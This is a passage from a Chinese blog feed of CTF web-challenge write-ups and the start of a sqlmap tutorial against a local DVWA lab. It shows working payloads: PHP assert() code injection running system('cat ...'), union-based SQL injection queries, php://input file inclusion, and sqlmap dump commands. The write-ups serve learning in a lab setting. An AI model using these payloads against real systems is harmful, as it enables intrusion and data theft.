substr(md5($value),5,4)==0)&#123;//substr(string,start,length)。===是包括变量值与类型完全相等。==只是比较两个数的值是否相等，由于substr是字符串，和数字比较的时候会强制转化成数字0，自然和0相等。  $_SESSION[&#39;nums&#39;]++;  $_SESSION[&#39;whoami&#39;] = $str_rands;  echo $str_rands;&#125;if($_SESSION[&#39;nums&#39;]&gt;=10)&#123;//循环10次输出flag，暴力破解  echo $flag;&#125;show_source(__FILE__);?&gt;</code></pre><p>因为md5不能对数组进行处理，MD5()计算数组会返回null，里面的判断是用==所以我们用数组传值那么<code>substr(md5($value),5,4)==0</code>这个条件恒成立。<br>因为我刚访问由于这段代码<code>$_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;</code> 我们要先传入<code>?value[]=ea</code> </p><p>那么nums就会自增，<code>$_SEESION[&#39;whoami&#39;] = 随机2个字母</code> </p><p>并同时输出到页面上，我们再根据输出的字符修改<code>$value[0].$value[1]</code>的值即可，只要操作大于等于10次，就可以出flag 。<br><img src="http://img-blog.csdnimg.cn/20191103170830809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>综上所述循环10次后输出flag：<br><img src="http://img-blog.csdnimg.cn/20191030175352961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4、没错！就是文件包含漏洞"><a href="#4、没错！就是文件包含漏洞" class="headerlink" title="4、没错！就是文件包含漏洞"></a>4、没错！就是文件包含漏洞</h3><p>题型：Web Upload<br>知识点：<br>1、当php开启allow_url_include的时候，可以用php://input伪协议包含文件<br>2、php中的system命令执行函数<br><img src="http://img-blog.csdnimg.cn/20191031202054697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这题也挺简单，利用了<strong>php伪协议</strong> ：</p><ol><li>php://input<br>构造场景：本地web服务器根目录下有文件<code>phpinput_server.php</code>，代码如下：<pre><code>&lt;?php  $a = $_GET[&#39;a&#39;];  $raw_post_data = file_get_contents($a,&#39;r&#39;);//&#39;php://input&#39;  echo $raw_post_data;?&gt;</code></pre></li></ol><p>在浏览器中按照如下方式访问：<br>地址栏输入的是：<code>http://localhost/phpinput_server.php?a=php://input</code><br>post框直接输入一段数据<br>Excute后，脚本会在页面中输出这段数据。<br><img src="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：此种方式可以用来获取post数据，但不能获取get数据。</p><p>既然题目是文件包含，我们来看下关键性函数的状态<br>allow_url_include<br><img src="http://img-blog.csdnimg.cn/20191031205339435.png" alt="在这里插入图片描述"><br>当<code>allow_url_include</code>为On而<code>allow_url_fopen</code>为Off的时候，我们可以用用<strong>php://input</strong>伪协议进行包含<br><img src="https://img-blog.csdnimg.cn/20191031205614164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到目录下有三个文件，flag是在第一个文件里<br>查看dle345aae.php：<br><img src="http://img-blog.csdnimg.cn/20191031212358170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">右键查看源码：得到flag<br><img src="http://img-blog.csdnimg.cn/20191031201323703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 Web进阶(一)</title>
      <link href="2019/10/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/"/>
      <url>2019/10/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>嗯..,终于把新手区的题做完了，感觉学到了不少东西( •̀ ω •́ )y   今天来记录下进阶题<br>1、ics-06<br>2、PHP2<br>3、mfw</p><a id="more"></a><p><strong>1、ics-06</strong><br><img src="http://img-blog.csdnimg.cn/20191013201933147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，一个看起来看来很炫酷的页面，瞎点一会发现只有一个报表中心可以进<br><img src="http://img-blog.csdnimg.cn/20191013203721575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始以为是sql注入题，尝试了一会发现不是，这题考察的是爆破，当id=2333时，得到flag。</p><p><img src="http://img-blog.csdnimg.cn/20191013212440794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2、PHP2</strong><br><img src="http://img-blog.csdnimg.cn/20191015191306595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，御剑扫描，如果扫不到就说明你字典里需要添上了。<br><img src="http://img-blog.csdnimg.cn/20191015191627512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现index.phps源码泄露，打开网页：<br><img src="http://img-blog.csdnimg.cn/20191015192041765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>即：</p><pre><code>&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;Can you anthenticate to this website?</code></pre><p>审计下代码，发现 要得到flag要满足两个条件<br>一，要使<code>&quot;admin&quot;===$_GET[id]</code>不成立<br>二，经过<code>$_GET[id] = urldecode($_GET[id]);</code>，使得<code>$_GET[id] == &quot;admin&quot;</code>成立。</p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1、Url的编码格式采用的是ASCII码(16进制) 不能在Url中包含任何非ASCII字符，例如中文，如果Url中含有非ASCII字符的话, 浏览器会对Url进行urlencode，然后发送给服务器</p><p>2、关于<code>urldecode/urlencode</code>函数：<br>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode<br>然后在这段代码中运行时，会自动进行一次urldecode<br>在urldecode()函数中，再一次进行一次解码</p><pre><code>urldecode(%2561)=%61urldecode(%61)=a</code></pre><p>当第一次比较时，实际是</p><pre><code>if(&quot;admin&quot;===&quot;%61dmin&quot;) </code></pre><p>而经过<code>$_GET[id] = urldecode($_GET[id]);</code></p><p>第二次比较是：</p><pre><code>if(&quot;admin&quot; == &quot;admin&quot;);</code></pre><p>故构造:<br><code>?id=%2561dmin</code></p><p>得到flag<br><img src="http://img-blog.csdnimg.cn/20191015201013128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、mfw</strong><br>打开题目，是一个网站：<br><img src="http://img-blog.csdnimg.cn/20191015202250382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便翻翻，发现这个页面<br><img src="http://img-blog.csdnimg.cn/2019101520294454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>怀疑存在源码泄露，用dirsearch扫描一下，发现git源码泄露：</p><p><img src="http://img-blog.csdnimg.cn/2019101520374553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>用法：</p><pre><code>dirsearch.py -u 目标网址 -e *(指定语言，也可以不指定为*)</code></pre><p>详细请看：<code>https://www.freebuf.com/column/153277.html</code><br>果然存在git源码泄露；</p><p>利用GitHack下载源码<br>关于GitHack一个git泄露利用脚本，很好用~<br>详细请看<code>https://www.freebuf.com/sectool/66096.html</code><br>常用</p><pre><code>python27 GitHack.py url/.git/</code></pre><p><img src="http://img-blog.csdnimg.cn/20191015204333899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成，得到一个以url命名的文件夹；打开发现有flag.php但里面没东西；<br>查看index.php文件：<br><img src="http://img-blog.csdnimg.cn/20191015205219293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到了关键代码：</p><pre><code>&lt;?phpif (isset($_GET[&#39;page&#39;])) &#123;    $page = $_GET[&#39;page&#39;];&#125; else &#123;    $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#39;..&#39; is dangerous!assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);?&gt;</code></pre><p>分析代码可知，<br>若想得到flag，即得到”Detected hacking attempt!”<br>则需要给page传入的须满足</p><pre><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)</code></pre><p>尝试</p><pre><code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></pre><p>即</p><pre><code>$file = &quot;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&quot;;</code></pre><p>即传<code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p><p>拼成下面语句：</p><pre><code>assert(&quot;strpos(&#39;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&#39;, &#39;..&#39;) === false&quot;) ordie(&quot;Detected hacking attempt!&quot;);</code></pre><p>F12 得到flag<br><img src="http://img-blog.csdnimg.cn/20191015205840114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>assert() 函数：<br>用来判断一个表达式是否成立。返回true or false<br>详细：<code>https://www.cnblogs.com/yuerdongni/archive/2013/10/12/3364954.html</code><br>strpos()函数：<br><img src="http://img-blog.csdnimg.cn/20191015210633922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考文章：<code>https://blog.csdn.net/wyj_1216/article/details/95218671</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 web（二）</title>
      <link href="2019/10/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20web%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/10/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20web%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这周接着刷攻防世界的web题（￣︶￣）↗　<br>1、command_execution<br>2、simple_php<br>3、NaNNaNNaNNaN-Batman<br>4、NewsCenter</p><a id="more"></a><h2 id="1、command-execution"><a href="#1、command-execution" class="headerlink" title="1、command_execution"></a>1、command_execution</h2><p><img src="https://img-blog.csdnimg.cn/20190925201112852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看提示这题为<strong>命令执行漏洞（command_execution）</strong>，关于命令执行漏洞，我前面有篇博客详细介绍了，大家不了解的话的可以去看看<code>https://blog.csdn.net/qq_43531669/article/details/99771487</code><br>先尝试一下127.0.0.1 发现执行成功，得到回显：<br><img src="https://img-blog.csdnimg.cn/20190927195057483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那没什么好说的了，直接查看目录下的所有文件吧：<br><img src="https://img-blog.csdnimg.cn/20190927195438230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到这些，接着查看home目录下的文件：<br><img src="https://img-blog.csdnimg.cn/20190927195602377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现flag文件，然后查看得到flag<br><img src="https://img-blog.csdnimg.cn/20190927200107438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2、simple-php"><a href="#2、simple-php" class="headerlink" title="2、simple_php"></a>2、simple_php</h2><p><img src="https://img-blog.csdnimg.cn/20190927200346866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目地址：</p><pre><code>﻿&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#39;a&#39;];$b=@$_GET[&#39;b&#39;];if($a==0 and $a)&#123;    echo $flag1;&#125;if(is_numeric($b))&#123;    exit();&#125;if($b&gt;1234)&#123;    echo $flag2;&#125;?&gt;</code></pre><p>得到这么几串代码<br>意思是当a==0，但a的值又不能为0时输出flag1，b大于1234，并且b不是数字时输出flag2； 于是构造：<code>?a=0a&amp;b=12345A</code>便可绕过得到完整的flag。<img src="https://img-blog.csdnimg.cn/20190927201406132.png" alt="在这里插入图片描述"></p><h2 id="3、NaNNaNNaNNaN-Batman"><a href="#3、NaNNaNNaNNaN-Batman" class="headerlink" title="3、NaNNaNNaNNaN-Batman"></a>3、NaNNaNNaNNaN-Batman</h2><p><img src="https://img-blog.csdnimg.cn/20190927205956336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点</strong>：js代码（eval函数,alert函数）正则、代码审计</p><blockquote><p>eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。<br>alert()函数:用于显示带有一条指定消息和一个确定按钮的警告框。</p></blockquote><p>下载附件，以文本格式打开：<br><img src="https://img-blog.csdnimg.cn/20190928091903759.png" alt="在这里插入图片描述"><br>是一段JS的代码，改后缀为.html在游览器打开：<br><img src="https://img-blog.csdnimg.cn/20190928094003459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个输入框，但输入什么都没有反应，继续分析js代码   <code>=￣ω￣=</code> 审计代码可以看到<code>eval</code>函数执行了<code>_</code>变量中的内容也就是<code>&#39; &#39;</code>中的内容，但是，要注意的是，它并没有执行<code>$()</code>函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的<code>$()</code>函数源码完整显示出来：<br><img src="https://img-blog.csdnimg.cn/20190928101554343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理一下得到：</p><pre><code>function $()&#123;var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)   if(e.match(/^be0f23/)!=null)      if(e.match(/233ac/)!=null)         if(e.match(/e98aa$/)!=null)             if(e.match(/c7be9/)!=null)&#123;             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];             var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];             var s=[t,n,r,i];             for(var o=0;o&lt;13;++o)&#123;             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;             &#125;&#125;document.write(&#39;&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;&#39;);delete _</code></pre><p>分析代码，我们的目标是打印出<code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code><br>因此我们要满足关键变量e的条件</p><pre><code>e.length==16e.match(/^be0f23/)!=nulle.match(/233ac/)!=nulle.match(/e98aa$/)!=nulle.match(/c7be9/)!=null</code></pre><p>这里又用到了正则表达式 <code>^</code>表示开头一定要匹配到be0f23，<code>$</code>表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求，于是构造<code>e=be0f233ac7be98aa</code><br>在输入框中输入e的值，点击Ok<br>成功得到flag：<br><code>flag&#123;it’s_a_h0le_in_0ne&#125;</code></p><p>也可以直接将核心代码直接在控制台执行</p><pre><code>var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];        var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];        var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];        var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];        var s=[t,n,r,i];    for(var o=0;o&lt;13;++o)        &#123;         document.write(s[o%4][0]);         s[o%4].splice(0,1)        &#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/20190928120243165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4、NewsCenter"><a href="#4、NewsCenter" class="headerlink" title="4、NewsCenter"></a>4、NewsCenter</h2><p><img src="https://img-blog.csdnimg.cn/20190928212847819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这一题考察的是 SQL 注入，这里演示下手动注入和sqlmap两种方法。</p><h3 id="手动注入："><a href="#手动注入：" class="headerlink" title="手动注入："></a>手动注入：</h3><p>首先查返回列，经测试共三列返回数据。<img src="https://img-blog.csdnimg.cn/20191005132953391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着查看数据库名，看到库名为news</p><p><img src="https://img-blog.csdnimg.cn/20191005133051511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表名，构造命令：<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() </code><img src="https://img-blog.csdnimg.cn/20191005133338522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到两个表，news中无数据，查看表 secret_table字段<br><code>1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39; secret_table&#39;</code><br><img src="https://img-blog.csdnimg.cn/20191005133834584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后执行查询语句<br><code>0&#39; union select 1,2,fl4g from secret_table#</code></p><p><img src="https://img-blog.csdnimg.cn/2019100513405950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="Sqlmap自动注入："><a href="#Sqlmap自动注入：" class="headerlink" title="Sqlmap自动注入："></a>Sqlmap自动注入：</h3><p>首先用bp抓包，得到http文件头<br><img src="https://img-blog.csdnimg.cn/20191005134302818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>保存为文本。然后执行命令：<code>  python sqlmap.py -r 1.txt --dbs</code> 查数据库<img src="https://img-blog.csdnimg.cn/20191005134426206.png" alt="在这里插入图片描述"><br>再执行命令：<code> python sqlmap.py -r 1.txt -D news --dump</code> 获取库中的所有数据<img src="https://img-blog.csdnimg.cn/20191005134942111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到 flag ！   (￣▽￣)”/</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap 入门使用攻略</title>
      <link href="2019/09/28/Sqlmap%20%E5%85%A5%E9%97%A8%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/"/>
      <url>2019/09/28/Sqlmap%20%E5%85%A5%E9%97%A8%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p> <strong>1、Sqlmap介绍</strong>：</p><ul><li>Sqlmap 是一个自动化的 SQL 注入工具，其主要功能是扫描、发现并利用给定的 Url 的 Sql 注入漏洞。</li><li>基于python编写，需要在python2环境下才可以正常运行。</li><li>目前支持 MySQL、 Oracle、 PostgreSQL、 Microsoft SQL Server、 Microsoft Access 等主流数据库。 </li></ul><p>项目地址：<a href="http://sqlmap.org/">源码下载</a></p><p><strong>2、Sql注入原理</strong>：</p><ul><li>当客户端提交的数据未作处理或转义直接带入数据库,就可能造成sql注入,攻击者通过直接构造不同的sql语句来实现对数据库的任意操作。</li></ul><p><strong>3、Sql注入的分类</strong>：</p><ul><li><p>按变量类型分：数字型和字符型</p></li><li><p>按照HTTP提交方式分：POST注入、GET注入和 Cookie注入</p></li><li><p>按注入方式分：布尔注入、延时注入、报错注入、联合注入、内联注入 等…</p></li></ul><p>Sqlmap 使用 5 种 sql 注入技术（不加参数默认测试所有注入技术）：</p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>联合查询注入，可以使用 union 的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><p>当使用 Sqlmap 对一个注入点是进行了测试时，可以使用 <code>-v x</code> 参数指定回显信息的复杂度，x属于[0~6]：</p><p>共有 7 个等级，默认为 1：</p><ul><li>0：只显示python错误以及严重的信息。</li><li>1：同时显示基本信息和警告信息。（默认）</li><li>2：同时显示debug信息。</li><li>3：同时显示注入的payload。</li><li>4：同时显示HTTP请求。</li><li>5：同时显示HTTP响应头。</li><li>6：同时显示HTTP响应页面。</li></ul><p>如果想看到 Sqlmap 发送的测试 payload 最好的等级就是3，例：</p><pre><code class="python">python sqlmap.py -v 3 -u &quot;http://www.xxx.com/a.php?id=xxx&quot;</code></pre><p> <strong>4、测试Sqlmap</strong>：</p><p>这里使用DVWA靶场进行测试,在DVWA页面中选择 SQL Injection</p><p><img src="https://img-blog.csdnimg.cn/20201105173214418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一、首先肯定是要判断是否有注入漏洞，在输入框输入1，返回</p><pre><code>ID: 1First name: adminSurname: admin</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105174614243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>返回正常；</p><p>再次输入<code>1&#39;</code>，报错，返回</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near  “ <code>1&#39;</code> “  at line 1</p><p><img src="https://img-blog.csdnimg.cn/20201105204730652.png#pic_center" alt="在这里插入图片描述"><br>此时可以断定有SQL注入漏洞且为单引号闭合的字符型注入，下面利用SQLMap进行注入攻击。</p><p>二、利用Sqlmap工具：</p><p>1、先进行基本的测试</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/index.php?id=1&amp;Submit=Submit&quot; </code></pre><p><code>-u</code> 参数表示url，指定连接目标</p><p>得到提示：</p><p><img src="https://img-blog.csdnimg.cn/2020110520533660.png#pic_center" alt="在这里插入图片描述"><br>Sqlmap 得到302重定向到 “ <a href="http://localhost/DVWA/login.php">http://localhost:80/DVWA/login.php</a> 